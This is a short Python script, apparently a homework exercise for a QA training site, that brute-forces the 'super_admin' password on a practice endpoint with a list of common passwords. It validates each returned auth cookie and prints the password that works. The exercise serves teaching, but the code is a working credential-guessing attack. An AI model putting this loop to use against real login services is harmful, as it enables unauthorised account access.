import requests

passwords = ['123456', 'password', '12345678', 'qwerty', 'abc123', '123456789', '111111', '1234567', 'iloveyou', 'adobe123[a]', '123123', 'admin', '1234567890', 'letmein', 'photoshop[a]', '1234', 'monkey', 'shadow', 'sunshine', '12345', 'password1', 'princess', 'azerty', 'trustno1', '0', 'baseball', 'dragon', 'football', 'mustang', 'access', 'master', 'michael', 'superman', '696969', 'batman', 'welcome', '1qaz2wsx', 'login', 'qwertyuiop', 'solo', 'passw0rd', 'starwars', '121212', 'flower', 'hottie', 'loveme', 'zaq1zaq1', 'hello', 'freedom', 'whatever', 'qazwsx', '666666', '654321', '!@#$%^&*', 'charlie', 'aa123456', 'donald', 'qwerty123', '1q2w3e4r', '555555', 'lovely', '7777777', '888888', '123qwe', '12345678', '1234567', 'ashley', 'bailey', 'jesus', 'ninja']
for i in passwords:
    payload = {"login": "super_admin", "password": i}
    response = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data = payload)
    cookie_value = response.cookies.get('auth_cookie')

    cookies = {'auth_cookie': cookie_value}
    response2 = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookies)
    if response2.text != 'You are NOT authorized':
        print ("Верный пароль: ", i)
        print(response2.text)